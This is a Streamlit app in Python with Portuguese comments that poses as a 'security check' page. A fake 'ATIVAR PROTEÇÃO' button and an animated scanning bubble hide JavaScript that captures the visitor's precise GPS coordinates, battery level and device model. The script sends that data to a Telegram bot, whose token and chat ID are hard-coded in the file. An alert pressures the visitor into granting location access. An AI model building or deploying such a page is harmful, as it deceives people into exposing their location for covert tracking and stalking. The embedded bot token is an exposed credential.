import streamlit as st
import time

# --- DADOS DO SEU BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO ORIGINAL (BOLHA E BOTÃO) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none !important; }
    
    .scanner-box { 
        display: flex; flex-direction: column; align-items: center; padding: 20px; 
        animation: float 3s ease-in-out infinite; 
    }
    @keyframes float {
        0%, 100% { transform: translateY(0px); }
        50% { transform: translateY(-15px); }
    }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
        display: flex; align-items: center; justify-content: center;
    }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    
    .btn-fiel {
        background-color: white; color: #333; border: none;
        padding: 12px 20px; border-radius: 4px; font-size: 14px;
        font-family: sans-serif; display: flex; align-items: center;
        gap: 8px; cursor: pointer; font-weight: bold; text-transform: uppercase;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)

caixa_bolha = st.empty()
caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text" id="pct">4%</div></div></div>', unsafe_allow_html=True)

# --- O INJETOR QUE REALMENTE FUNCIONA ---
# Aqui não tem erro: o clique dispara o GPS e o GPS dispara o Telegram.
js_bruto = f"""
<div style="display: flex; justify-content: flex-start;">
    <button class="btn-fiel" onclick="forceGPS()">
        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
async function forceGPS() {{
    const options = {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }};
    
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const bat = await navigator.getBattery();
            const level = Math.round(bat.level * 100);
            const model = navigator.userAgent.split('(')[1].split(')')[0];
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            
            const msg = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + model + "\\n🔋 " + level + "%\\n📍 Local: https://www.google.com/maps?q=" + lat + "," + lon;
            
            // Envio direto via API do Telegram (sem depender do Streamlit)
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: msg }})
            }});
            
            // Faz a bolha girar avisando o Python
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{
            alert("Para continuar, você deve clicar em 'OK' ou 'Permitir' na janela de localização que apareceu.");
        }},
        options
    );
}}
</script>
"""

# Esse 'allow="geolocation"' é OBRIGATÓRIO para o navegador não matar o botão
clicou = st.components.v1.html(js_bruto, height=70)

if clicou:
    for i in range(4, 101, 10):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.1)
    st.success("Proteção Concluída")
